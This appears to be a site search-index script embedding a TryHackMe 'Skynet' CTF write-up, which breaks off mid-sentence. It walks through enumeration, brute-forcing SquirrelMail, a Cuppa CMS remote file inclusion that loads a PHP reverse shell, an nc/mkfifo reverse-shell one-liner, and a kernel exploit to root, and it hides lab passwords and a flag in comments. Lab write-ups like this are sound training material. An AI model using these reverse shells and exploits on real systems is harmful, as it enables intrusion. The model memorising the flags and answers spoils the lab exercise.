var suggestions=document.getElementById('suggestions'),userinput=document.getElementById('userinput');document.addEventListener('keydown',inputFocus);function inputFocus(a){a.keyCode===191&&(a.preventDefault(),userinput.focus()),a.keyCode===27&&(userinput.blur(),suggestions.classList.add('d-none'))}document.addEventListener('click',function(a){var b=suggestions.contains(a.target);b||suggestions.classList.add('d-none')}),document.addEventListener('keydown',suggestionFocus);function suggestionFocus(b){const d=suggestions.querySelectorAll('a'),e=[...d],a=e.indexOf(document.activeElement);let c=0;b.keyCode===38?(b.preventDefault(),c=a>0?a-1:0,d[c].focus()):b.keyCode===40&&(b.preventDefault(),c=a+1<e.length?a+1:a,d[c].focus())}(function(){var b=new FlexSearch({preset:'score',cache:!0,doc:{id:'id',field:['title','description','content'],store:['href','title','description']}}),c=[{id:0,href:"/docs/tryhackme/skynet/",title:"SkyNet",description:"A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?",content:'\u003ch2 id="room-description"\u003eRoom Description\u003c/h2\u003e\n\u003cp\u003eA vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine? \u003ca href="https://tryhackme.com/room/skynet"\u003eFind THM room here\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id="used-commands"\u003eUsed Commands\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003enmap -sV -sC -oN nmap.out -vv \u0026lt;target ip\u0026gt;\ngobuster dir -u http://\u0026lt;target ip\u0026gt;:\u0026lt;target port\u0026gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt\n/usr/share/enum4linux/enum4linux.pl -a \u0026lt;target ip\u0026gt; | tee enum4linux.txt\nsmbclient //\u0026lt;target ip\u0026gt;/anonymous -U\npython -m http.server \u0026lt;webserver port\u0026gt;\nwget http://\u0026lt;webserver ip\u0026gt;:\u0026lt;webserver port\u0026gt;/\u0026lt;file name\u0026gt;\necho \u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc \u0026lt;atk ip\u0026gt; \u0026lt;atkport\u0026gt; \u0026gt;/tmp/f\u0026quot; \u0026gt; shell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id="enumeration"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eThe task description does not give too much information. Using Nmap and gobuster is a good way to start with.\nThe next two steps show how the way I enumerated the target with Nmap and gobuster. The third step will be a summary of what information was found.\u003c/p\u003e\n\u003ch3 id="nmap"\u003eNmap\u003c/h3\u003e\n\u003cp\u003eRun: \u003ccode\u003enmap -sV -sC -oN nmap.out -vv \u0026lt;target ip\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eStarting Nmap 7.80 ( https://nmap.org ) at 2021-04-24 20:54 UTC\nNSE: Loaded 151 scripts for scanning.\n...\nPORT    STATE SERVICE     REASON         VERSION\n22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7\n|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=\n|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ\n80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Skynet\n110/tcp open  pop3        syn-ack ttl 64 Dovecot pop3d\n|_pop3-capabilities: UIDL AUTH-RESP-CODE RESP-CODES SASL PIPELINING TOP CAPA\n139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp open  imap        syn-ack ttl 64 Dovecot imapd\n|_imap-capabilities: Pre-login more LITERAL+ have LOGINDISABLEDA0001 ID IDLE post-login SASL-IR listed ENABLE OK IMAP4rev1 LOGIN-REFERRALS capabilities\n445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\nMAC Address: 02:9D:B2:03:AA:DD (Unknown)\nService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eContinue with the next step in another shell.\u003c/p\u003e\n\u003ch3 id="gobuster"\u003eGobuster\u003c/h3\u003e\n\u003cp\u003eStart gobuster and let it work in parallel. I expected a different result when running the following command without a specified port, but this was not the case.\u003c/p\u003e\n\u003cp\u003eRun \u003ccode\u003egobuster dir -u http://\u0026lt;target ip\u0026gt;:\u0026lt;target port\u0026gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.61.56:80\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/04/24 21:08:15 Starting gobuster\n===============================================================\n/admin (Status: 301)\n/css (Status: 301)\n/js (Status: 301)\n/config (Status: 301)\n/ai (Status: 301)\n/squirrelmail (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2021/04/24 21:08:32 Finished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="whats-in-the-reports"\u003eWhat\u0026rsquo;s in the reports?\u003c/h3\u003e\n\u003cp\u003eNmap and Gobuster show a couple of open ports and available directories. Read the reports carefully. You should be able to extract similar information as follow. I\u0026rsquo;ve listed them below:\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eService\u003c/th\u003e\n\u003cth\u003ePort\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eApache 2.4.18 Webserver\u003c/td\u003e\n\u003ctd\u003e80\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSMB\u003c/td\u003e\n\u003ctd\u003e139/445\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSSH\u003c/td\u003e\n\u003ctd\u003e22\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDovecot Mailserver\u003c/td\u003e\n\u003ctd\u003e110/143\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDirectories\u003c/th\u003e\n\u003cth\u003eResult\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e/admin\u003c/td\u003e\n\u003ctd\u003eForbidden\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e/config\u003c/td\u003e\n\u003ctd\u003eForbidden\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e/squirrelmail\u003c/td\u003e\n\u003ctd\u003eLogin\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e/ai\u003c/td\u003e\n\u003ctd\u003eForbidden\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eFurther, have a look at the source code of the website. Sometimes you can spot some useful information.\u003c/p\u003e\n\u003ch3 id="website"\u003eWebsite\u003c/h3\u003e\n\u003cp\u003eOpen your browser and navigate to \u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_welcome_hu714079a8a4f298dd8e775b851d0ebc62_10553_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_welcome.png" width="876" height="306" alt="Screenshot of the website behind the webserver"\u003e\n\u003cp\u003eI played around a little but there seems not much to be. Then I used searchsploit in the hope to find some vulnerabilities for Apache 2.4.18 but couldn\u0026rsquo;t find something that helps to get a foot in the door. At this point, I thought about going for that login screen \u003ccode\u003e/squirrelmail\u003c/code\u003e but the information is rare so I decided to go for SMB.\nLet\u0026rsquo;s go!\u003c/p\u003e\n\u003ch3 id="smb"\u003eSMB\u003c/h3\u003e\n\u003cp\u003eUse enum4linux to collect info about shares. Use the path to your enum4linx.pl script run it.\u003c/p\u003e\n\u003cp\u003eFor me it\u0026rsquo;s \u003ccode\u003e/usr/share/enum4linux/enum4linux.pl -a \u0026lt;target ip\u0026gt; | tee enum4linux.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e ==========================\n|    Target Information    |\n ==========================\nTarget ........... 10.10.61.56\nRID Range ........ 500-550,1000-1050\nUsername ......... \'\'\nPassword ......... \'\'\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n...\n ====================================\n|    Session Check on 10.10.61.56    |\n ====================================\n[+] Server 10.10.61.56 allows sessions using username \'\', password \'\'\n...\n ============================\n|    Users on 10.10.61.56    |\n ============================\nindex: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:\n\nuser:[milesdyson] rid:[0x3e8]\n...\n ========================================\n|    Share Enumeration on 10.10.61.56    |\n ========================================\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        anonymous       Disk      Skynet Anonymous Share\n        milesdyson      Disk      Miles Dyson Personal Share\n        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))\nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on 10.10.61.56\n//10.10.61.56/print$    Mapping: DENIED, Listing: N/A\n//10.10.61.56/anonymous Mapping: OK, Listing: OK\n//10.10.61.56/milesdyson        Mapping: DENIED, Listing: N/A\n//10.10.61.56/IPC$      [E] Cant understand response:\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing\n ======================================================================\n|    Users on 10.10.61.56 via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================\n[I] Found new SID: S-1-22-1\n[I] Found new SID: S-1-5-21-2393614426-3774336851-1116533619\n[I] Found new SID: S-1-5-32\n[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username \'\', password \'\'\nS-1-5-21-2393614426-3774336851-1116533619-500 *unknown*\\*unknown* (8)\nS-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\\nobody (Local User)\nS-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\\milesdyson (Local User)\n...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCheck the log and find some useful info for us.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eFact\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eAnonymous Login\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eUsers\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eSKYNET\\milesdyson (Local User)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eShares\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eanonymous\u003c/code\u003e, \u003ccode\u003emilesdyson\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eLet\u0026rsquo;s try to connect and see what we get!\u003c/p\u003e\n\u003cp\u003eShare of interest is \u003ccode\u003eanonymous\u003c/code\u003e user is \u003ccode\u003e\'\'\u003c/code\u003e and password is \u003ccode\u003e\'\'\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eRun \u003ccode\u003esmbclient //\u0026lt;target ip\u0026gt;/anonymous -U\u003c/code\u003e and confirm two times.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@kali:~/Desktop# smbclient //10.10.61.56/anonymous -U\nEnter WORKGROUP\\root\'s password:\nTry \u0026quot;help\u0026quot; to get a list of possible commands.\nsmb: \\\u0026gt; dir\n  .                                   D        0  Thu Nov 26 16:04:00 2020\n  ..                                  D        0  Tue Sep 17 07:20:17 2019\n  attention.txt                       N      163  Wed Sep 18 03:04:59 2019\n  logs                                D        0  Wed Sep 18 04:42:16 2019\n                9204224 blocks of size 1024. 5788828 blocks available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGet both \u003ccode\u003eattention.txt\u003c/code\u003e and the log files in \u003ccode\u003elogs\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-txt"\u003eA recent system malfunction has caused various passwords to be changed.\nAll skynet employees are required to change their password after seeing this.\n-Miles Dyson\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003elog1.txt\u003c/code\u003e seems to contain some passwords.\u003c/p\u003e\n\u003cp\u003eUser is \u003ccode\u003emilesdyson\u003c/code\u003e password is taken from the list.\nFirst I used Hydra and tried to brute-force SMB without success. So I choose to switch over to \u003ccode\u003e/squirrelmail\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id="squirrelmail"\u003eSquirrelMail\u003c/h3\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_hue52adc275bda1e1278bca5ea3c5d8f84_34702_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_squirrelmail.png" width="544" height="438" alt="Login screen showing SquirrelMail"\u003e\n\u003cp\u003eI used BurpSuite for brute-forcing the password. If you are not familiar with Burp Suite check out this introductory room on THM \u003ca href="https://tryhackme.com/room/rpburpsuite"\u003eBurpSuite created by DarkStar7471\u003c/a\u003e.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel_hu9b4481d154e21dd78a0dd77e1c29c7b4_32670_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel.png" width="1141" height="516" \u003e\n\u003cp\u003eLoad the password list and start the attack. You will receive a list of responses where you need to pick the outstanding one (look at the response code). Use the credentials and try to log in.\u003c/p\u003e\n\u003c!-- cyborg007haloterminator --\u003e\n\u003cp\u003eThat\u0026rsquo;s also the password the current task is asking for.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_squirrelmail_hu83ef59a49b7a8481b84cc2340ef91dab_42840_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_squirrelmail.png" width="1141" height="477" \u003e\n\u003cp\u003eRead through the mails and find the following info:\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eEmail\u003c/th\u003e\n\u003cth\u003eInformation\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1\u003c/td\u003e\n\u003ctd\u003ePassword for SMB\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2\u003c/td\u003e\n\u003ctd\u003eBinary string\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3\u003c/td\u003e\n\u003ctd\u003esome strange text\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset_hu41d27eae9f2cfd9d39a0b2818cee5083_11275_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset.png" width="686" height="219" alt="Screenshot of mail 1"\u003e\nThe first mail shows a new password that we will give a try!\u003c/p\u003e\n\u003cp\u003e\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2_hu2c9114f30f88cd33e3ffbe156ab98c55_12085_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2.png" width="686" height="219" alt="Screenshot of mail 2"\u003e\nThe second mail contains some binary code.\u003c/p\u003e\n\u003cp\u003e\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3_huf5ada19bae37ac8ec9cfefbdd9ca26ed_11359_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3.png" width="686" height="219" alt="Screenshot of mail 3"\u003e\nThe third mail contains some more crazy text.\u003c/p\u003e\n\u003c!-- )s{A\u00262Z=F^n_E.B` --\u003e\n\u003cp\u003eUse the password in the first mail to log in using smbclient like above.\u003c/p\u003e\n\u003cp\u003eRun \u003ccode\u003esmbclient //\u0026lt;target ip\u0026gt;/milesdyson -U milesdyson\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eEnter WORKGROUP\\milesdysons password: \u0026lt;password from email\u0026gt;\nTry \u0026quot;help\u0026quot; to get a list of possible commands.\nsmb: \\\u0026gt; dir\n  .                                   D        0  Tue Sep 17 05:05:47 2019\n  ..                                  D        0  Tue Sep 17 23:51:03 2019\n  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019\n  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019\n  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019\n  notes                               D        0  Tue Sep 17 05:18:40 2019\n  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019\n  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019\n\n    9204224 blocks of size 1024. 5831472 blocks available\nsmb: \\\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="whats-the-hidden-directory"\u003eWhat\u0026rsquo;s the hidden directory?\u003c/h3\u003e\n\u003cp\u003eCheck out the \u003ccode\u003enotes\u003c/code\u003e directory and find \u003ccode\u003eimportant.txt\u003c/code\u003e. This file contains a hidden folder.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-txt"\u003e1. Add features to beta CMS /****************\n2. Work on T-800 Model 101 blueprints\n3. Spend more time with my wife\n\u003c/code\u003e\u003c/pre\u003e\n\u003c!-- /45kra24zxs28v3yd --\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_personal_page_huda169eee04fed8fe77d2ccb76163082c_13372_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_personal_page.png" width="726" height="168" \u003e\n\u003cp\u003eThere is nothing really useful on this site. Seems to be a dead end.\nLet\u0026rsquo;s go through what we have found so far.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id="quick-summary"\u003eQuick Summary\u003c/h2\u003e\n\u003cp\u003eThere is SSH, SMB, an Apache Webserver, and a Dovecot MailServer.\nWe successfully logged into SMB share anonymous and found a text file that told us that there was a malfunction causing passwords to be changed.\nOne of the log files contained a list of passwords that we used to brute-force into SquirrelMail.\nWe again found a password in one of the mails and successfully logged into SMB share of \u003ccode\u003emilesdyson\u003c/code\u003e. From there we found another hidden \u003ccode\u003edirectory\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eLet\u0026rsquo;s move on and enumerate the hidden directory.\u003c/p\u003e\n\u003cp\u003eFor me, that part was a bit tricky because digging deeper was not my first thought about how to continue. Instead, I was lurking for any options regarding SSH but then found out there wasn\u0026rsquo;t enough information to do so. Finally, I stuck at this point and had to read another write-up to get my feet on the ground. The solution is quite simple: Start over and collect more info from a different base.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id="digging-deeper"\u003eDigging deeper\u003c/h2\u003e\n\u003cp\u003eNavigate to that directory using your browser. There is an image of milesdyson some text about him. The source code does not give any more information. The only option seems to be to dig deeper.\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eRun gobuster again on this directory\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eRun \u003ccode\u003egobuster dir -u http://\u0026lt;target ip\u0026gt;/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250\u003c/code\u003e\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_gobuster_hidden_hu3c9220d348ba62dbd6a807bd8b86e686_29106_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_gobuster_hidden.png" width="1249" height="563" \u003e\n\u003cp\u003eThere is another directory \u003ccode\u003e/administrator\u003c/code\u003e. Navigate there and find a CMS (something we already read about in the notes).\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_cuppa_hu5a7820c3407a0b7a30c4d796742e00d6_42061_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_cuppa.png" width="810" height="407" \u003e\n\u003cp\u003eGreat! We don\u0026rsquo;t have credentials to log in but what about using searchsploit?. Maybe there are some known exploits on this CMS.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esearchsploit cuppa\u003c/code\u003e\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa_hu729ffc2566b8bb962890f804198eb45f_13175_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa.png" width="899" height="137" \u003e\n\u003cp\u003eYou can also \u003ca href="https://www.exploit-db.com/exploits/25971"\u003echeckout corresponding CVE on exploit-db\u003c/a\u003e and read the description there.\u003c/p\u003e\n\u003cp\u003eThat\u0026rsquo;s another question that you can answer now.\n\u003ccode\u003eWhat\'s the vulnerability called when you can include a remote file for malicious purposes?\u003c/code\u003e\n2/3 of the answer is in the title of the exploit you downloaded. Use google and search for the first word. You\u0026rsquo;ll quickly find it on your own.\u003c/p\u003e\n\u003c!-- remote file inclusion --\u003e\n\u003chr\u003e\n\u003ch2 id="gain-initial-reverse-shell"\u003eGain initial Reverse Shell\u003c/h2\u003e\n\u003cp\u003eIt\u0026rsquo;s recommended to read the exploit description in every detail to understand the following.\u003c/p\u003e\n\u003cp\u003eDownload \u003ca href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"\u003ephp-reverse-shell.php from github\u003c/a\u003e and change the IP and port.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_reverse_shell_php_hu28d5ae768dee42c37c5b4df4ee8000ef_5300_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_reverse_shell_php.png" width="305" height="200" \u003e\n\u003cul\u003e\n\u003cli\u003eSetup a webserver \u003ccode\u003epython3 -m http.server 8888\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSet up a Netcat listener \u003ccode\u003enc -lvnp 4444\u003c/code\u003e.\u003cbr\u003e\nUse the same port that you included in \u003ccode\u003ephp-reverse-shell.php\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAppend \u003ccode\u003ealerts/alertConfigField.php?urlConfig=http://\u0026lt;webserver ip\u0026gt;:8888/shell.php\u003c/code\u003e on the URL of the login page \u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;/45kra24zxs28v3yd/administrator/\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe URL should look like this:\u003cbr\u003e\n\u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://\u0026lt;webserver ip\u0026gt;:8888/shell.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eCopy that URL to your browser and hit enter.\u003c/p\u003e\n\u003c!-- user flag 7ce5c2109a40f958099283600a9ae807 --\u003e\n\u003ch2 id="extend-shell-to-root"\u003eExtend Shell to root\u003c/h2\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eIf you passed the beginner path offered by THM you should have knowledge about multiple ways to stabalize and root your shell.\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eRead different write-ups and you will see different approaches. A good way to start with is i.e. \u003ccode\u003esudo -l\u003c/code\u003e or \u003ccode\u003ecrontabs\u003c/code\u003e. Try both ways on your own.\u003c/p\u003e\n\u003ch3 id="solution-1-linux-kernel"\u003eSolution 1: Linux Kernel\u003c/h3\u003e\n\u003cp\u003eOn the attack machine:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCheck Linux version: 4.8\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003esearchsploit Linux 4.8\u003c/code\u003e to search for any vulnerabilities\u003c/li\u003e\n\u003cli\u003eThere is one record with a version matching the OS version above\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48_hucdfec540c0455864729ad5b4b8b5c545_13560_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48.png" width="1186" height="62" \u003e\u003c/li\u003e\n\u003cli\u003eCopy this exploit using \u003ccode\u003esearchsploit -m 43418.c\u003c/code\u003e to your local folder\u003c/li\u003e\n\u003cli\u003eStart a webserver \u003ccode\u003epython -m http.server 8888\u003c/code\u003e (where you copied the exploit to)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn the target machine:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eChange directory \u003ccode\u003ecd /var/www/html\u003c/code\u003e as user \u003ccode\u003ewww-data\u003c/code\u003e can write there.\u003c/li\u003e\n\u003cli\u003eDownload the file to the target via http.server \u003ccode\u003ewget http://\u0026lt;webserver ip\u0026gt;:8888/43418.c\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e$ wget http://10.10.48.92:8000/43418.c\n--2021-04-29 11:42:36--  http://10.10.48.92:8000/43418.c\nConnecting to 10.10.48.92:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 24033 (23K) [text/plain]\nSaving to: \'43418.c\'\n\n     0K .......... .......... ...                             100% 65.5M=0s\n\n2021-04-29 11:42:36 (65.5 MB/s) - \'43418.c\' saved [24033/24033]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eCompile that file: \u003ccode\u003egcc 43418.c -o privesc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eand run \u003ccode\u003e./privesc\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e$ gcc 43418.c -o privesc\n$ ./privesc\n^[[3~bash: cannot set terminal process group (1290): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@skynet:/var/www/html# whoami\nwhoami\nroot\nroot@skynet:/var/www/html# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="solution-2-wildcards"\u003eSolution 2: Wildcards\u003c/h3\u003e\n\u003cp\u003eThis way is quite interesting! For further reading search for \u003ccode\u003eexploit tar wildcard for privilege escalation\u003c/code\u003e on google.\u003c/p\u003e\n\u003cp\u003eThe principle behind this approach is to trick tar to execute files as different users (i.e. as root).\u003cbr\u003e\nIn the following case multiple files are 